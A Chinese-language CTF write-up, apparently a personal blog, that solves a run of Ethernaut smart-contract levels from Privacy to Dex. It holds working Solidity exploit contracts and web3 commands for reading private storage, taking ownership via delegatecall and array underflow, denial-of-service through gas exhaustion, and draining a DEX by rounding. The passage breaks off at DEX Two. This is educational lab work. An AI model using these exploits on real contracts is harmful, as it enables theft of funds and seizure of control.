<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;// ...</span><br><span class="line"></span><br><span class="line">contract Building &#123;</span><br><span class="line">    address public target = 0x225B6F1A5823e1dA88195BD6bA571f9D9B4C659f;</span><br><span class="line">    bool public flag = false;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">        if(flag == false)&#123;</span><br><span class="line">            flag = true;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;goTo(uint256)&quot;,1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="privacy">12 privacy</h2>
<blockquote>
<p>漏洞类型：隐私数据上链</p>
</blockquote>
<p>跟 Vault 那题区别不大，也是计算出变量存储的 slot 然后 getStorageAt
就可以了，只不过 unlock 函数里取了 data[2] 的前十六字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool public locked = true;   //0</span><br><span class="line">uint256 public ID = block.timestamp;   //1</span><br><span class="line">uint8 private flattening = 10;      //2</span><br><span class="line">uint8 private denomination = 255;     //2</span><br><span class="line">uint16 private awkwardness = uint16(now);     //2</span><br><span class="line">bytes32[3] private data;       // 3 4 5</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0</span>);</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">1</span>);</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000669db9d8&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">2</span>);</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000b9d8ff0a&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">3</span>);</span><br><span class="line"><span class="string">&#x27;0x981640b3c7b393cf50dc3dc775cc956dd7293184d5d7e41799a3d83ecd976f87&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">4</span>);</span><br><span class="line"><span class="string">&#x27;0xed854f8fb8465be2b28d43a0d5e5f3e6b0679e5aa11c05848878c90d0b8c8b17&#x27;</span></span><br><span class="line"><span class="comment">// this is what we need</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">5</span>);</span><br><span class="line"><span class="string">&#x27;0x7511365c632ac62dc1071f0f24d9dc40245bfa8c01761c5462eea210a26621e8&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">6</span>);</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&quot;0x7511365c632ac62dc1071f0f24d9dc40&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-one">13 Gatekeeper One</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:全局变量gas；数据类型转换</p>
</blockquote>
<p>先看gate1，跟 telephone 那道题一样，写个合约调就行了。</p>
<p>gate2需要控制 gas，比较直接的方式就是爆破 call 函数里的 gas 参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (uint i = 0; i &lt; 500; i ++) &#123;</span><br><span class="line">    try gatekeeper.enter&#123;gas: 8191 * 3 + i&#125;(gateKey) returns (bool result) &#123;</span><br><span class="line">        return result;</span><br><span class="line">    &#125; catch &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gate3 有这样几条限制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 低 2byte 与 低 4byte 相等</span><br><span class="line">uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</span><br><span class="line">// 低 4byte 与 低 8byte 不等</span><br><span class="line">uint32(uint64(_gateKey)) != uint64(_gateKey)</span><br><span class="line">// 低 4byte 与 tx.origin 的低 2byte 相等</span><br><span class="line">uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</span><br></pre></td></tr></table></figure>
<p>bytesxx 取的是高位的xx字节，uintxx
取的是低位的xx位，当小变量与大变量作比较时，会将小变量零扩展，即前面添0.
了解这些 gate3 就可以绕了。很简单，只要取自己钱包地址的低 64bit，与
0xffffffff0000ffff 相与就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function attack(address addr) external returns (bool) &#123;</span><br><span class="line">        GatekeeperOne pwner = GatekeeperOne(addr);</span><br><span class="line">        bytes8 gatekey = bytes8(uint64(uint160(tx.origin))) &amp; 0xffffffff0000ffff;</span><br><span class="line"></span><br><span class="line">        for(uint i = 0; i &lt; 500; i++) &#123;</span><br><span class="line">            try pwner.enter&#123;gas: 8192 * 3 + i&#125;(gatekey) returns (bool result) &#123;</span><br><span class="line">                return result;</span><br><span class="line">            &#125; catch &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-two">14 Gatekeeper Two</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:yul</p>
</blockquote>
<p>gate1 也是要调合约</p>
<p>对于 gate2 ，caller 函数等价于返回 msg.sender，extcodesize
函数是计算该地址的合约代码长度，gate2 中要求合约代码长度为
0，而当合约的构造函数正在执行时，该合约的代码还未被完全部署到链上，因此
extcodesize 在这个时间点上返回的结果为 0。</p>
<p>所以我们选择在 Attack 函数的构造函数中执行攻击代码</p>
<p>对于gate3，我们需要让 gateKey 等于 0xffffffffffffffff ^ MitM 调用
enter 的函数签名，exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        GatekeeperTwo g = GatekeeperTwo(addr);</span><br><span class="line">        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;</span><br><span class="line">        g.enter(gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="naught-coin">15 Naught Coin</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:ERC代币</p>
</blockquote>
<p>ERC-20 标准支持将一定数量的代币授权 (approve) 给某个地址 (被授权方),
然后被授权方就能够使用 transferFrom 支配授权方的代币</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// current balance: 1000000000000000000000000</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// approve to another contract</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(<span class="string">&quot;0x148258832f9925fC21Cf5B13d5aE21EE1e6ce1F0&quot;</span>, <span class="string">&quot;1000000000000000000000000&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// invoke Attack.attack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance again</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>
<h2 id="preservation">16 Preservation</h2>
<blockquote>
<p>漏洞类型：delegatecall修改状态变量</p>
</blockquote>
<blockquote>
<p>take-away msg:delegatecall是本地上下文执行</p>
</blockquote>
<p>我们再来重新认识一下 delegatecall：</p>
<p>假设我们有合约 A 通过 delegatecall 调用了合约 B 的函数 funcB，那么
funcB 中修改的变量其实都是合约 A 中的变量。那么可能有人要问，合约 B
是怎么知道 A 的变量的？实际上，delegatecall
是根据状态变量的定义顺序去寻找被调用合约对应的 slot 位置,
然后进行访问和修改。</p>
<p>因此，LibraryContract 中的 setTime 修改的 storedTime，其实是修改了
Preservation 合约中的
timeZone1Library，我们可以将其修改为恶意合约地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await contract.setFirstTime(&quot;0xAC93AF93Afb73D776694684bDD39dD900EF27C9D&quot;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但这里我有一个不太明白的点是，明明传入的参数是 32bytes 的，而
timeZone1Library 是 20bytes 的 address
变量，我不清楚是怎么数据转换以及放入 slot 当中的</p>
</blockquote>
<p>而当我们修改了 timeZone1Library 为恶意合约地址，再用 setFirstTime
调用 setTime 就调用的是恶意合约的 setTime 了，此时恶意合约直接写好同样的
setTime 签名，内部实现 owner = msg.sender 即可成功提权。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 改为恶意合约的地址</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&quot;0xAC93AF93Afb73D776694684bDD39dD900EF27C9D&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提权</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&quot;anything&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EvilLibraryContract &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 /*_time*/) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="recovery">17 Recovery</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:链上一切信息都是公开透明的</p>
</blockquote>
<p>十七题了，还是没办法脱离题解自己想到哪里是 vulnerable
的，合约基础还没打牢...得继续努力😭</p>
<p>这道题大意为 Recovery 合约创建了 SimpleToken 合约，但是找不到
SimpleToken
这个合约的地址了，所以需要我们找到这个地址，并把这个地址里的币转移出来。</p>
<p>首先要解决的问题是：如何找到这个合约？</p>
<ul>
<li>方案一：etherscan 直接搜实例地址</li>
</ul>
<p>通过跟进“实例地址”（其实就是 Recovery
这个合约的地址）创建的新合约的地址，我们可以找到 SimpleToken 的地址</p>
<ul>
<li>方案二：<a
href="https://learnblockchain.cn/2019/06/10/address-compute/">计算</a></li>
</ul>
<p>这个方案我没仔细看...先把链接放在这儿</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"><span class="comment"># keccak256(address, nonce)</span></span><br><span class="line"><span class="comment"># 0xfe... 是实例地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(web3.Web3.keccak(rlp.encode([<span class="number">0xfeB38d24C57d0462741d90E44b07d976f99fBf71</span>,<span class="number">1</span>]))[<span class="number">12</span>:])))</span><br><span class="line"><span class="comment"># 0xd1d9a8e9388dbeb6f0714340e4d44b0587c6145e &lt;-这个是 SimpleToken 的地址</span></span><br></pre></td></tr></table></figure>
<p>找到合约之后，我们要解决的问题是，如何把 SimpleToken
中的合约代币转出来？</p>
<p>我们可以看到 SimpleToken 合约中存在 destruct 函数，而 <a
href="remix.ethereum.org">Remix</a>
为我们提供了与现有合约交互的功能，即部署时的 "At
Address"，这里借了张图👇</p>
<figure>
<img
src="https://img.exp10it.io/2024/04/202404221233489.png?size=medium"
alt="借的图" />
<figcaption aria-hidden="true">借的图</figcaption>
</figure>
<p>将我们钱包的地址写在 destroy 中，就可以将合约中的代币转出啦</p>
<h2 id="magicnumber">18 MagicNumber</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:EVM bytecode</p>
</blockquote>
<p>今天完全不想看原理。。先 fork 一下别人的 wp 改天再来看</p>
<p>条件: 提供一个合约地址, 该合约最多包含 10 个 opcode, 并在调用
whatIsTheMeaningOfLife 方法时返回数字 42</p>
<p>https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-iii-the-function-selector-6a9b6886ea49</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-iv-function-wrappers-d8e46672b0ed</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-v-function-bodies-2d19d4bef8be</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-vi-the-swarm-hash-70f069e22aef</p>
<figure>
<img
src="https://img.exp10it.io/2024/04/202404242022619.jpeg?size=medium"
alt="合约创建的过程" />
<figcaption aria-hidden="true">合约创建的过程</figcaption>
</figure>
<p>代码分为两部分</p>
<ul>
<li>initialization code</li>
<li>runtime code</li>
</ul>
<p>具体讲解看文章就行</p>
<p>runtime code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x2a ; store 42 in memory</span><br><span class="line">PUSH1 0x80</span><br><span class="line">MSTORE</span><br><span class="line">PUSH1 0x20 ; return the memory address of 42</span><br><span class="line">PUSH1 0x80</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure>
<p>转成hex正好10bytes<code>602a60805260206080f3</code></p>
<p>根据上面几篇文章里介绍的原理, 编写 runtime code
的时候其实无需考虑具体的方法名是什么 (whatIsTheMeaningOfLife)</p>
<p>因为 EVM 执行字节码时永远都是从上至下执行,
而正常合约字节码的开头会根据 calldata 内 selector 的值 JUMPI
到特定的位置, 以此实现不同方法的调用 (路由)</p>
<p>对于这题来说, 只需要返回 42 就行 (RETURN), 也就无需加入针对 selector
的判断</p>
<p>initialization code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x0a ; copy runtime code to memory</span><br><span class="line">PUSH1 0x0c</span><br><span class="line">PUSH1 0x00</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x0a ; return the memory address of code</span><br><span class="line">PUSH1 0x00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure>
<p>转为hex<code>600a600c600039600a6000f3</code></p>
<p>最终 hex, 前 12 bytes 为 initialization code, 后 10 bytes 为 runtime
code</p>
<p><code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// deploy contract</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: <span class="string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// 右键回显，复制object</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;blockHash&quot;</span>: <span class="string">&quot;0x63eb03c9313eb08f9634a66cf4f6dc29cf8f00447c3881e39c743e9c06af19a5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;blockNumber&quot;</span>: <span class="number">6390825</span>,</span><br><span class="line">    <span class="string">&quot;contractAddress&quot;</span>: <span class="string">&quot;0x71e6E63B138806572D11A60A8778FfA154ab96c5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cumulativeGasUsed&quot;</span>: <span class="number">1517854</span>,</span><br><span class="line">    <span class="string">&quot;effectiveGasPrice&quot;</span>: <span class="number">13186593185</span>,</span><br><span class="line">    <span class="string">&quot;from&quot;</span>: <span class="string">&quot;0x9a80a78bebe92ef9cdfc4ca116fc4925237fdbd0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gasUsed&quot;</span>: <span class="number">55354</span>,</span><br><span class="line">    <span class="string">&quot;logs&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;logsBloom&quot;</span>: <span class="string">&quot;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;to&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&quot;transactionHash&quot;</span>: <span class="string">&quot;0xa33ade6dd8c074ed59d0db434b3e7768944240707d1a4a9a61e8bb28f99d55f6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transactionIndex&quot;</span>: <span class="number">16</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;0x2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setSolver 注意这里的地址得是sendTransaction回显的合约地址</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSolver</span>(<span class="string">&quot;0x2132C7bc11De7A90B87375f282d36100a29f97a9&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="alien-codex">19 Alien Codex</h2>
<blockquote>
<p>漏洞类型：</p>
</blockquote>
<blockquote>
<p>take-away msg:数组越界访问+slot对应keccak标识符（还不是很懂）</p>
</blockquote>
<p>做这道题之前先阅读<a
href="https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018">这篇</a>，读到动态数组的存储方式</p>
<p>另外，我们可以通过以下代码来查看 codex 存放的真实 slot 地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getSlotForArrayElement(uint256 _elementIndex) public pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 startingSlotForArrayElements = keccak256(abi.encode(1));</span><br><span class="line">        return bytes32(uint256(startingSlotForArrayElements) + _elementIndex);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此外，一个合约中存在 2^256 个 slot 槽，也就是说，slot[2^256 - 1] 就是
slot 的最后一个 32bytes 长的元素。同时，本题 revise
函数虽然在修改下标大于 length 的越界变量时会报错，但 retract
函数并没有对容量做检查，因此，我们很轻松地就可以通过 retract 函数将
codex 的 length 减为 2^256-1，进而修改通过 revise(i,'evilcontent') 将
slot 中任意一个位置修改为 'evilcontent'。</p>
<p>在本题中，我们需要将 slot[0] 中的 owner
改为我们自己钱包的地址。因此，思路如下：</p>
<ol type="1">
<li>makeContact</li>
<li>通过 retract 函数将 length 减为 2^256 - 1</li>
<li>此时使用 keccak256(abi.encodePacked(uint256(1))) 计算出存放 codex
的插槽的 slot 地址<code>array_addr</code></li>
<li>因为 array_addr 距离 slot[0] 还有 diff = (2^256 - 1) - array_addr +
1 这么多；而 codex[0] 正好是 slot[array_addr]。</li>
<li>因此，slot[0] = codex[0 + diff]，exp如下</li>
</ol>
<p>有了 slot[0] 的位置，而且我们现在也已经知道 contact 在 slot[0]
中，codex 的长度独占 slot[1]。而根据<a
href="https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there">这篇</a>文章，<a
href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/helpers/Ownable-05.sol">Ownable-05</a>
中的 owner 地址变量存放在 AlienCodex 合约变量的上方，也就是
slot[0]，从代码角度看，可以理解为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address private _owner;</span><br><span class="line">bool public contact;</span><br><span class="line">bytes32[] public codex;</span><br></pre></td></tr></table></figure>
<p>因此，我们可以将 slot[0] 修改为 0x..001&lt;address&gt;。exp
如下：</p>
<ol type="1">
<li><p>await contract.makeContact()</p></li>
<li><p>await contract.retract()</p></li>
<li><p>我们可以在本地部署以下合约，并调用getSlotForArrayElement(0)，这里本地回显的<code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>这个地址跟远程存储
codex 的 slot 地址一模一样</p></li>
<li><p>计算 diff = 2^256 -
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，得到diff
=
0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a，即35707666377435648211887908874984608119992236509074197713628505308453184860938</p></li>
<li><p>await
contract.revise(diff,'0x0000000000000000000000019a80a78bebE92EF9cDfC4CA116fC4925237fDbd0')</p></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSlotForArrayElement(uint256 _elementIndex) public pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 startingSlotForArrayElements = keccak256(abi.encode(1));</span><br><span class="line">        return bytes32(uint256(startingSlotForArrayElements) + _elementIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="denial">20 Denial</h2>
<blockquote>
<p>漏洞类型：gas耗尽</p>
</blockquote>
<p>条件: 在 owner 调用 withdraw 时拒绝提取资金 (合约仍有资金, 并且交易的
gas 少于 1M)</p>
<p>其实就是在 receive/fallback 里写一个死循环将 gas 耗尽, 这样后续调用
transfer 转账的时候就会 revert</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    uint256 counter = 0;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            counter ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setWithdrawPartner</span>(<span class="string">&#x27;0x&quot;evil_contract_addr&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="shop">21 Shop</h2>
<blockquote>
<p>漏洞类型：</p>
</blockquote>
<blockquote>
<p>take-away msg:合约调用的非原子性？</p>
</blockquote>
<p>本题针对 view 函数的缺陷进行了攻击，跟 Elevator
那题的思路很像，都是在 victim 合约在调用外部 evil
合约函数时，自身状态变量的更新前没有合理约束条件导致的，攻击流程如下：</p>
<ol type="1">
<li><p>当 MyBuyer 合约调用 shop.buy() 时，Shop 合约会调用 MyBuyer 的
price 函数。</p></li>
<li><p>在 price 函数被调用时，shop.isSold() 仍然是 false，因此返回
101。</p></li>
<li><p>Shop 合约检查 price 返回的值为 101，满足条件，于是设置 isSold 为
true，并更新 price 为 101。</p></li>
<li><p>然后 Shop 再次调用 price 函数为状态变量 price 赋值，此时
shop.isSold() 已经是 true，所以返回 99。因为 isSold 已经更新为
true，Shop 合约不会再次进行检查或更新。</p></li>
</ol>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// contract Shop 粘贴过来</span><br><span class="line"></span><br><span class="line">contract MyBuyer is Buyer &#123;</span><br><span class="line">    Shop shop;</span><br><span class="line"></span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        shop = Shop(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256) &#123;</span><br><span class="line">        if (shop.isSold() == false) &#123;</span><br><span class="line">            return 101;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() external &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="dex">22 Dex</h2>
<blockquote>
<p>漏洞类型：精度缺失</p>
</blockquote>
<blockquote>
<p>take-away msg:solidity不支持原生浮点数，DEX</p>
</blockquote>
<p>这道题背后考察的是 dex
的原理，但由于浮点数处理异常，每次交换时用户希望交换的数目可能小于实际交换的数目，因此来回倒几笔钱，我们就可以多拿到本来不属于我们的钱（？</p>
<p>dex 的基本原理是将一对代币加入流动池以提供流动性,
这样就可以实现两种代币之间的交换,
交换的价格是根据流动池内代币的比例动态计算的</p>
<p>对于这道题来说, 流动池内一对代币 X 和 Y
之间的汇率与这两种代币在流动池内的总量成反比</p>
<p>比如池子里有 100 X 和 10 Y, 那么汇率就是 1 Y = 10 X</p>
<p>如果流动池内代币 X 的总量增大, 那么 X 相对于 Y 在贬值, 即每个 X
能兑换的 Y 会变少</p>
<p>相反, 如果 X 的总量减少, 那么 X 相对于 Y 在升值, 即每个 X 能兑换的 Y
会变多</p>
<p>题目不能够手动修改 token1 或 token2 的地址</p>
<p>然后虽然 addLiquidity 函数被限制了 onlyOwner,
但实际上仍然可以通过手动调用 token1/token2 合约的方式来强制添加流动性,
不过这个点具体怎么利用目前还没怎么想到</p>
<p>getSwapPrice 用于动态计算用代币 from 兑换 to 时的价格，但 Solidity
没有浮点数, 整数之间相除得到的结果会被去整, 即丢掉后面的小数位数。</p>
<p>当用户在 token1 和 token2 之间来回兑换时,
可以看到每次能拿到的代币数量其实是在变多的, 这样多倒几次最终就能将 dex
池内某一类型的代币搬空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let token1 = await contract.token1();</span><br><span class="line">let token2 = await contract.token2();</span><br><span class="line"></span><br><span class="line">await contract.approve(instance, 1000);</span><br><span class="line"></span><br><span class="line">await contract.swap(token1, token2, 10);</span><br><span class="line">await contract.swap(token2, token1, 20);</span><br><span class="line">await contract.swap(token1, token2, 24);</span><br><span class="line">await contract.swap(token2, token1, 30);</span><br><span class="line">await contract.swap(token1, token2, 41);</span><br><span class="line"></span><br><span class="line">// swap with 45 token2 because 65 * 110 / 45 = 158 &gt; 110 and 46 * 110 / 45 = 110</span><br><span class="line">await contract.swap(token2, token1, 45);</span><br><span class="line"></span><br><span class="line">// should return 0</span><br><span class="line">(await contract.balanceOf(token1, instance)).toString();</span><br></pre></td></tr></table></figure>
<h2 id="dex-two">23 DEX TWO</h2>
<blockquote>
<p>漏洞类型：精度缺失</p>
</blockquote>
<blockquote>
<p>twm(take-away msg)：同上</p>
</blockquote>
<p>这题与 Dex 的区别在于 swap 函数没有了对 from 和 to 代币地址的限制,
这表示我们可以利用自己发行的代币与 dex 内的 token1/token2 交换</p>
